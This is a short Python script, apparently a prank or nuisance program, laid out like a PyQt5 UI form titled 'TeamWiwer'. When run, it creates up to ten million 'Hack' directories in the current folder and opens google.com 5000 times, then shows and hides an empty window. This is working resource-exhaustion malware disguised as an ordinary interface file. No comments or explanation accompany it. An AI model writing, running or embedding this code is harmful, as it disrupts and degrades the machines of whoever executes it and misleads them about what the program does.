import time
from PyQt5 import QtCore, QtGui, QtWidgets
import os

class Ui_Form(object):
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(116, 16)
        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "TeamWiwer"))
    def dosyaolustur(self):
        os.chdir("./")
        toplam = 0
        while toplam < 10000000:
            os.mkdir("Hack{}".format(toplam))
            toplam += 1
        site = 0
        while site < 5000:
            os.startfile("www.google.com")
            site +=1
hack = Ui_Form()
hack.dosyaolustur()
while True:
    import sys
    app = QtWidgets.QApplication(sys.argv)
    pencere = QtWidgets.QMainWindow()
    ui = Ui_Form()
    ui.setupUi(pencere)
    pencere.show()
    pencere.hide()
    sys.exit(app.exec_())
